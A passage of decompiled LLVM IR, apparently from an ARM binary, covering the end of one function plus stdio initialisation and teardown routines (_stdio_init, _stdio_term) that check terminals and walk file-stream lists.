  %v0_1739c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1739c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_173a0

dec_label_pc_173a0:                               ; preds = %dec_label_pc_173d0.dec_label_pc_173a0_crit_edge, %dec_label_pc_17398
  %v0_173a0 = phi i32 [ %v0_173a0.pre, %dec_label_pc_173d0.dec_label_pc_173a0_crit_edge ], [ %v0_1739c, %dec_label_pc_17398 ]
  %v1_173a0 = inttoptr i32 %v0_173a0 to i32*
  %v2_173a0 = load i32, i32* %v1_173a0, align 4
  store i32 %v2_173a0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_173a0, i32* %r2.global-to-local, align 4
  %v2_173ac72 = load i32, i32* %v1_173a0, align 4
  store i32 %v2_173ac72, i32* %r3.global-to-local, align 4
  %v3_173b074 = icmp uge i32 %v2_173ac72, %v2_173a0
  store i1 %v3_173b074, i1* %cpsr_c.global-to-local, align 1
  %v9_173b080 = icmp eq i32 %v2_173ac72, %v2_173a0
  br i1 %v9_173b080, label %dec_label_pc_173b8, label %dec_label_pc_173d0

dec_label_pc_173b8:                               ; preds = %dec_label_pc_173a0, %dec_label_pc_173b8.dec_label_pc_173ac_crit_edge
  %v0_173b881 = phi i32 [ %v1_173b0.pre, %dec_label_pc_173b8.dec_label_pc_173ac_crit_edge ], [ %v2_173a0, %dec_label_pc_173a0 ]
  store i32 %v0_173b881, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_173c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_173c8, label %dec_label_pc_173cc, label %dec_label_pc_173b8.dec_label_pc_173ac_crit_edge

dec_label_pc_173b8.dec_label_pc_173ac_crit_edge:  ; preds = %dec_label_pc_173b8
  %v0_173ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_173b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_173ac = inttoptr i32 %v0_173ac.pre to i32*
  %v2_173ac = load i32, i32* %v1_173ac, align 4
  store i32 %v2_173ac, i32* %r3.global-to-local, align 4
  %v3_173b0 = icmp uge i32 %v2_173ac, %v1_173b0.pre
  store i1 %v3_173b0, i1* %cpsr_c.global-to-local, align 1
  %v9_173b0 = icmp eq i32 %v2_173ac, %v1_173b0.pre
  br i1 %v9_173b0, label %dec_label_pc_173b8, label %dec_label_pc_173d0

dec_label_pc_173cc:                               ; preds = %dec_label_pc_173b8
  %v0_173cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_173cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_173d0

dec_label_pc_173d0:                               ; preds = %dec_label_pc_173a0, %dec_label_pc_173b8.dec_label_pc_173ac_crit_edge, %dec_label_pc_173cc
  %v0_173d8 = phi i32 [ %v0_173cc, %dec_label_pc_173cc ], [ %v2_173ac72, %dec_label_pc_173a0 ], [ %v2_173ac, %dec_label_pc_173b8.dec_label_pc_173ac_crit_edge ]
  %v1_173d0 = phi i32 [ %v0_173cc, %dec_label_pc_173cc ], [ %v2_173a0, %dec_label_pc_173a0 ], [ %v1_173b0.pre, %dec_label_pc_173b8.dec_label_pc_173ac_crit_edge ]
  %v3_173d0 = icmp uge i32 %v0_173d8, %v1_173d0
  store i1 %v3_173d0, i1* %cpsr_c.global-to-local, align 1
  %v9_173d0 = icmp eq i32 %v0_173d8, %v1_173d0
  br i1 %v9_173d0, label %dec_label_pc_173d8, label %dec_label_pc_173d0.dec_label_pc_173a0_crit_edge

dec_label_pc_173d0.dec_label_pc_173a0_crit_edge:  ; preds = %dec_label_pc_173d0
  %v0_173a0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_173a0

dec_label_pc_173d8:                               ; preds = %dec_label_pc_173d0
  %v2_173d8 = icmp ne i32 %v1_173d0, 0
  store i1 %v2_173d8, i1* %cpsr_c.global-to-local, align 1
  %v7_173dc = icmp slt i32 %v1_173d0, 2
  br i1 %v7_173dc, label %dec_label_pc_17400, label %dec_label_pc_173e0

dec_label_pc_173e0:                               ; preds = %dec_label_pc_173d8
  %v0_173e0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_173e0, i32* %r0.global-to-local, align 4
  %v0_173e4 = load i32, i32* @r1, align 4
  %v1_173e4 = add i32 %v0_173e4, 129
  store i32 %v1_173e4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17400

dec_label_pc_173fc:                               ; preds = %dec_label_pc_17040, %dec_label_pc_17024, %dec_label_pc_1704c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17400

dec_label_pc_17400:                               ; preds = %dec_label_pc_1737c, %dec_label_pc_173d8, %bb58, %dec_label_pc_17084, %dec_label_pc_173e0, %dec_label_pc_173fc
  %v0_17400 = load i32, i32* @r5, align 4
  store i32 %v0_17400, i32* %r0.global-to-local, align 4
  %v2_17408 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17408, i32* %r4.global-to-local, align 4
  store i32 %v6_16fe4, i32* @r5, align 4
  store i32 %v9_16fe4, i32* @r6, align 4
  store i32 %v12_16fe4, i32* @r7, align 4
  store i32 %v15_16fe4, i32* @r8, align 4
  ret i32 %v0_17400

; uselistorder directives
  uselistorder i32 %v0_173cc, { 1, 0, 2 }
  uselistorder i32 %v1_173b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_173a0, { 1, 0 }
  uselistorder i32 %v0_17350, { 1, 0, 2 }
  uselistorder i32 %v1_17334.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17324, { 1, 0 }
  uselistorder i32 %v0_172cc, { 1, 0, 2 }
  uselistorder i32 %v1_172b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17264, { 1, 0, 2 }
  uselistorder i32 %v1_17248, { 0, 2, 1 }
  uselistorder i32 %v4_17224, { 2, 1, 0, 3 }
  uselistorder i32 %v1_171d4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_17158, { 1, 2, 0 }
  uselistorder i32 %v1_170e8, { 1, 0 }
  uselistorder i32 %v0_170e8, { 1, 0 }
  uselistorder i32 %v1_170d0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17074, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 53, 5, 6, 7, 8, 9, 11, 10, 51, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 52, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 36, 37, 9, 10, 11, 34, 35, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 16384, { 74, 75, 0, 1, 76, 37, 67, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 19, 73, 18, 57, 17, 53, 35, 54, 16, 51, 15, 52, 14, 55, 36, 56, 34, 58, 13, 59, 12, 60, 11, 61, 10, 62, 9, 63, 8, 64, 7, 65, 6, 66, 43, 77, 4, 78, 5, 79, 80, 46, 81, 47, 82, 48, 83, 44, 84, 20, 85, 45, 86, 21, 87, 22, 88, 24, 89, 23, 90, 26, 91, 25, 92, 27, 93, 28, 94, 29, 95, 30, 96, 31, 97, 49, 98, 32, 2, 50, 99, 33, 3 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 131072, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 12, 0, 11, 8, 7, 10, 9, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 ()* @malloc, { 43, 42, 41, 4, 3, 2, 0, 1, 7, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_17400, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_173fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_173d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_173b8, { 1, 0 }
  uselistorder label %dec_label_pc_1737c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17354, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1733c, { 1, 0 }
  uselistorder label %dec_label_pc_172e0, { 1, 0 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_172d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_172b8, { 1, 0 }
  uselistorder label %dec_label_pc_17278, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_17268, { 1, 0 }
  uselistorder label %bb58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_171b0, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_17118._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_170c0, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1705c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17024, { 1, 2, 0 }
}

define i32 @function_17414(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17414:
  %v0_17414 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17414, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17414
  %v5_17414 = sdiv i32 %arg2, 16
  %v6_17414 = and i32 %v5_17414, %arg1
  %v5_17418 = sdiv i32 %arg2, 256
  %v6_17418 = and i32 %v6_17414, %v5_17418
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17414, %bb
  %v10_1741c = phi i32 [ %arg1, %dec_label_pc_17414 ], [ %v6_17418, %bb ]
  ret i32 %v10_1741c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1744c = call i32 @__aeabi_read_tp()
  %v3_17450 = load i16, i16* @global_var_23068.363, align 2
  %v4_17450 = sext i16 %v3_17450 to i32
  store i32 %v4_17450, i32* @r3, align 4
  store i32 %v0_1744c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1745c = add i32 %v4_17450, %v0_1744c
  %v3_1745c = inttoptr i32 %v2_1745c to i32*
  %v4_1745c = load i32, i32* %v3_1745c, align 4
  store i32 %v4_1745c, i32* @r6, align 4
  %v1_17460 = call i32 @isatty(i32 0)
  %v2_17468 = icmp eq i32 %v1_17460, 0
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r4, align 4
  br i1 %v2_17468, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_17474 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 304) to i16*), align 4
  %v7_17474 = zext i16 %v5_17474 to i32
  %v2_17478 = xor i32 %v7_17474, 256
  store i32 %v2_17478, i32* @r3, align 4
  %v2_1747c = trunc i32 %v2_17478 to i16
  store i16 %v2_1747c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 304) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_17484 = call i32 @isatty(i32 1)
  %v2_17488 = icmp eq i32 %v1_17484, 0
  br i1 %v2_17488, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_17490 = load i32, i32* @r4, align 4
  %v2_17494 = add i32 %v1_17490, 372
  %v3_17494 = inttoptr i32 %v2_17494 to i16*
  %v4_17494 = load i16, i16* %v3_17494, align 2
  %v2_17498 = xor i16 %v4_17494, 256
  store i16 %v2_17498, i16* %v3_17494, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_174a4 = load i16, i16* @global_var_23068.363, align 2
  %v4_174a4 = sext i16 %v3_174a4 to i32
  %v0_174a8 = load i32, i32* @r6, align 4
  %v1_174a8 = load i32, i32* @r5, align 4
  %v3_174a8 = add i32 %v1_174a8, %v4_174a4
  %v4_174a8 = inttoptr i32 %v3_174a8 to i32*
  store i32 %v0_174a8, i32* %v4_174a8, align 4
  ret i32 %v1_17484

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_174c4 = load i32, i32* @r4, align 4
  store i32 %v3_174c4, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -33260), i32* %r3.global-to-local, align 4
  %v2_174d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -33260) to i32*), align 4
  store i32 %v2_174d8, i32* %r0.global-to-local, align 4
  %v5_174d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -33256) to i32*), align 4
  store i32 %v5_174d8, i32* %r1.global-to-local, align 4
  %v8_174d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -33252) to i32*), align 4
  %v2_174e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_174e0, i32* %r3.global-to-local, align 4
  store i32 %v2_174d8, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_174ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 152) to i32*), align 4
  store i32 %v2_174d8, i32* %r0.global-to-local, align 4
  store i32 %v5_174d8, i32* %r1.global-to-local, align 4
  store i32 %v8_174d8, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -33272), i32* %r3.global-to-local, align 4
  %v1_174fc = inttoptr i32 %v4_174ec to i32*
  store i32 %v2_174d8, i32* %v1_174fc, align 4
  %v3_174fc = add i32 %v4_174ec, 4
  %v4_174fc = inttoptr i32 %v3_174fc to i32*
  %v5_174fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_174fc, i32* %v4_174fc, align 4
  %v6_174fc = add i32 %v4_174ec, 8
  %v7_174fc = inttoptr i32 %v6_174fc to i32*
  %v8_174fc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_174fc, i32* %v7_174fc, align 4
  %v0_17500 = load i32, i32* %r3.global-to-local, align 4
  %v1_17500 = inttoptr i32 %v0_17500 to i32*
  %v2_17500 = load i32, i32* %v1_17500, align 4
  store i32 %v2_17500, i32* %r0.global-to-local, align 4
  %v3_17500 = add i32 %v0_17500, 4
  %v4_17500 = inttoptr i32 %v3_17500 to i32*
  %v5_17500 = load i32, i32* %v4_17500, align 4
  store i32 %v5_17500, i32* %r1.global-to-local, align 4
  %v6_17500 = add i32 %v0_17500, 8
  %v7_17500 = inttoptr i32 %v6_17500 to i32*
  %v8_17500 = load i32, i32* %v7_17500, align 4
  %v2_17504 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_17504, i32* %r3.global-to-local, align 4
  store i32 %v2_17500, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_17510 = load i32, i32* %r7.global-to-local, align 4
  %v2_17510 = add i32 %v0_17510, 76
  %v3_17510 = inttoptr i32 %v2_17510 to i32*
  %v4_17510 = load i32, i32* %v3_17510, align 4
  store i32 %v4_17510, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_17518 = inttoptr i32 %v4_17510 to i32*
  %v2_17518 = load i32, i32* %v1_17518, align 4
  store i32 %v2_17518, i32* %r5.global-to-local, align 4
  %v2_1751c = add i32 %v0_17510, 160
  %v3_1751c = inttoptr i32 %v2_1751c to i32*
  %v4_1751c = load i32, i32* %v3_1751c, align 4
  store i32 %v2_17500, i32* %r0.global-to-local, align 4
  store i32 %v5_17500, i32* %r1.global-to-local, align 4
  store i32 %v8_17500, i32* %r2.global-to-local, align 4
  store i32 -33284, i32* %r3.global-to-local, align 4
  %v2_1752c = add i32 %v0_17510, -33284
  store i32 %v2_1752c, i32* %sl.global-to-local, align 4
  %v1_17530 = inttoptr i32 %v4_1751c to i32*
  store i32 %v2_17500, i32* %v1_17530, align 4
  %v3_17530 = add i32 %v4_1751c, 4
  %v4_17530 = inttoptr i32 %v3_17530 to i32*
  %v5_17530 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17530, i32* %v4_17530, align 4
  %v6_17530 = add i32 %v4_1751c, 8
  %v7_17530 = inttoptr i32 %v6_17530 to i32*
  %v8_17530 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17530, i32* %v7_17530, align 4
  %v0_175c0.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_175c016 = icmp eq i32 %v0_175c0.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_175c818 = add i32 %v0_175c0.pr, 56
  store i32 %v1_175c818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_175c016, label %dec_label_pc_175d4, label %dec_label_pc_17538

dec_label_pc_17538:                               ; preds = %entry, %.thread10
  %v0_17538 = phi i32 [ %v3_175bc, %.thread10 ], [ %v0_175c0.pr, %entry ]
  %v1_17538 = add i32 %v0_17538, 64
  %v2_17538 = inttoptr i32 %v1_17538 to i32*
  %v3_17538 = load i32, i32* %v2_17538, align 4
  store i32 %v3_17538, i32* %r3.global-to-local, align 4
  %v0_1753c = call i32 @__aeabi_read_tp()
  store i32 %v0_1753c, i32* %r0.global-to-local, align 4
  %v1_17540 = add i32 %v0_1753c, -1168
  store i32 %v1_17540, i32* %r6.global-to-local, align 4
  %v3_17544 = icmp uge i32 %v3_17538, %v1_17540
  store i1 %v3_17544, i1* %cpsr_c.global-to-local, align 1
  %v9_17544 = icmp eq i32 %v3_17538, %v1_17540
  br i1 %v9_17544, label %.thread1, label %dec_label_pc_17558

.thread1:                                         ; preds = %dec_label_pc_17538
  %v1_17548 = load i32, i32* %r5.global-to-local, align 4
  %v2_17548 = add i32 %v1_17548, 60
  %v3_17548 = inttoptr i32 %v2_17548 to i32*
  %v4_17548 = load i32, i32* %v3_17548, align 4
  %v2_1754c = add i32 %v4_17548, 1
  store i32 %v2_1754c, i32* %r3.global-to-local, align 4
  store i32 %v2_1754c, i32* %v3_17548, align 4
  br label %.thread10

dec_label_pc_17558:                               ; preds = %dec_label_pc_17538, %dec_label_pc_17564
  %v0_17558 = load i32, i32* %r2.global-to-local, align 4
  %v1_17558 = inttoptr i32 %v0_17558 to i32*
  %v2_17558 = load i32, i32* %v1_17558, align 4
  store i32 %v2_17558, i32* %r3.global-to-local, align 4
  %v1_1755c = load i32, i32* %r4.global-to-local, align 4
  %v3_1755c = icmp uge i32 %v2_17558, %v1_1755c
  store i1 %v3_1755c, i1* %cpsr_c.global-to-local, align 1
  %v9_1755c = icmp eq i32 %v2_17558, %v1_1755c
  br i1 %v9_1755c, label %dec_label_pc_17564, label %dec_label_pc_1757c

dec_label_pc_17564:                               ; preds = %dec_label_pc_17558
  store i32 %v2_17558, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17574 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17574, label %dec_label_pc_17578, label %dec_label_pc_17558

dec_label_pc_17578:                               ; preds = %dec_label_pc_17564
  %v0_17578 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17578, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1757c

dec_label_pc_1757c:                               ; preds = %dec_label_pc_17558, %dec_label_pc_17578
  %v0_1757c = phi i32 [ %v0_17578, %dec_label_pc_17578 ], [ %v2_17558, %dec_label_pc_17558 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1757c = icmp eq i32 %v0_1757c, 0
  %v2_17588.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1757c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_1757c
  %v1_17588 = load i32, i32* %r6.global-to-local, align 4
  %v3_17588 = add i32 %v2_17588.pre, 64
  %v4_17588 = inttoptr i32 %v3_17588 to i32*
  store i32 %v1_17588, i32* %v4_17588, align 4
  %v1_1758c = load i32, i32* %r1.global-to-local, align 4
  %v2_1758c = load i32, i32* %r5.global-to-local, align 4
  %v3_1758c = add i32 %v2_1758c, 60
  %v4_1758c = inttoptr i32 %v3_1758c to i32*
  store i32 %v1_1758c, i32* %v4_1758c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_1757c
  %v2_17580 = add i32 %v2_17588.pre, 8
  %v3_17580 = inttoptr i32 %v2_17580 to i32*
  %v4_17580 = load i32, i32* %v3_17580, align 4
  store i32 %v4_17580, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_17590 = add i32 %v2_17588.pre, 20
  %v4_17590 = inttoptr i32 %v3_17590 to i32*
  store i32 %v4_17580, i32* %v4_17590, align 4
  %v1_17594 = load i32, i32* %r2.global-to-local, align 4
  %v2_17594 = trunc i32 %v1_17594 to i16
  %v3_17594 = load i32, i32* %r5.global-to-local, align 4
  %v4_17594 = inttoptr i32 %v3_17594 to i16*
  store i16 %v2_17594, i16* %v4_17594, align 2
  %v1_17598 = load i32, i32* %r3.global-to-local, align 4
  %v2_17598 = load i32, i32* %r5.global-to-local, align 4
  %v3_17598 = add i32 %v2_17598, 24
  %v4_17598 = inttoptr i32 %v3_17598 to i32*
  store i32 %v1_17598, i32* %v4_17598, align 4
  %v1_1759c = load i32, i32* %r3.global-to-local, align 4
  %v2_1759c = load i32, i32* %r5.global-to-local, align 4
  %v3_1759c = add i32 %v2_1759c, 28
  %v4_1759c = inttoptr i32 %v3_1759c to i32*
  store i32 %v1_1759c, i32* %v4_1759c, align 4
  %v1_175a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_175a0 = load i32, i32* %r5.global-to-local, align 4
  %v3_175a0 = add i32 %v2_175a0, 16
  %v4_175a0 = inttoptr i32 %v3_175a0 to i32*
  store i32 %v1_175a0, i32* %v4_175a0, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_175a4 = load i32, i32* %sl.global-to-local, align 4
  %v1_175a4 = inttoptr i32 %v0_175a4 to i32*
  %v2_175a4 = load i32, i32* %v1_175a4, align 4
  store i32 %v2_175a4, i32* %r0.global-to-local, align 4
  %v3_175a4 = add i32 %v0_175a4, 4
  %v4_175a4 = inttoptr i32 %v3_175a4 to i32*
  %v5_175a4 = load i32, i32* %v4_175a4, align 4
  store i32 %v5_175a4, i32* %r1.global-to-local, align 4
  %v6_175a4 = add i32 %v0_175a4, 8
  %v7_175a4 = inttoptr i32 %v6_175a4 to i32*
  %v8_175a4 = load i32, i32* %v7_175a4, align 4
  store i32 %v8_175a4, i32* %r2.global-to-local, align 4
  %v1_175ac = load i32, i32* %r5.global-to-local, align 4
  %v2_175ac = add i32 %v1_175ac, 52
  %v3_175ac = inttoptr i32 %v2_175ac to i32*
  store i32 1, i32* %v3_175ac, align 4
  %v0_175b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_175b0 = add i32 %v0_175b0, 56
  store i32 %v1_175b0, i32* %r3.global-to-local, align 4
  %v2_175b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_175b8 = inttoptr i32 %v1_175b0 to i32*
  store i32 %v2_175b4, i32* %v1_175b8, align 4
  %v3_175b8 = add i32 %v0_175b0, 60
  %v4_175b8 = inttoptr i32 %v3_175b8 to i32*
  %v5_175b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_175b8, i32* %v4_175b8, align 4
  %v6_175b8 = add i32 %v0_175b0, 64
  %v7_175b8 = inttoptr i32 %v6_175b8 to i32*
  %v8_175b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_175b8, i32* %v7_175b8, align 4
  %v0_175bc = load i32, i32* %r5.global-to-local, align 4
  %v1_175bc = add i32 %v0_175bc, 32
  %v2_175bc = inttoptr i32 %v1_175bc to i32*
  %v3_175bc = load i32, i32* %v2_175bc, align 4
  store i32 %v3_175bc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_175c0 = icmp eq i32 %v3_175bc, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_175c8 = add i32 %v3_175bc, 56
  store i32 %v1_175c8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_175c0, label %dec_label_pc_175d4, label %dec_label_pc_17538

dec_label_pc_175d4:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_175d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_175d8 = add i32 %v0_175d8, 76
  %v3_175d8 = inttoptr i32 %v2_175d8 to i32*
  %v4_175d8 = load i32, i32* %v3_175d8, align 4
  store i32 %v4_175d8, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_175d8 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_175f814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_175f814, label %dec_label_pc_17600, label %dec_label_pc_175e4

dec_label_pc_175e4:                               ; preds = %dec_label_pc_175d4, %dec_label_pc_175f8
  %v1_175ec = phi i32 [ %storemerge, %dec_label_pc_175f8 ], [ %storemerge12, %dec_label_pc_175d4 ]
  %v1_175e4 = inttoptr i32 %v1_175ec to i16*
  %v2_175e4 = load i16, i16* %v1_175e4, align 2
  %v3_175e4 = zext i16 %v2_175e4 to i32
  store i32 %v3_175e4, i32* %r3.global-to-local, align 4
  %v1_175e8 = and i32 %v3_175e4, 64
  %v2_175e8 = icmp eq i32 %v1_175e8, 0
  br i1 %v2_175e8, label %dec_label_pc_175f8, label %bb39

bb39:                                             ; preds = %dec_label_pc_175e4
  store i32 %v1_175ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175f8

dec_label_pc_175f8:                               ; preds = %dec_label_pc_175e4, %bb39
  %v1_175f0 = xor i1 %v2_175e8, true
  call void @__pseudo_cond_branch(i1 %v1_175f0, i32 ptrtoint (i32* @global_var_17628.643 to i32))
  %v0_175f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_175f4 = add i32 %v0_175f4, 32
  %storemerge.in = inttoptr i32 %v1_175f4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_175f8 = icmp eq i32 %storemerge, 0
  br i1 %v2_175f8, label %dec_label_pc_17600, label %dec_label_pc_175e4

dec_label_pc_17600:                               ; preds = %dec_label_pc_175f8, %dec_label_pc_175d4
  %v2_17604 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_17604, i32* %r4.global-to-local, align 4
  %v1_17608 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17608

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_175bc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1755c, { 1, 0 }
  uselistorder i32 %v4_1751c, { 2, 1, 0 }
  uselistorder i32 %v4_174ec, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
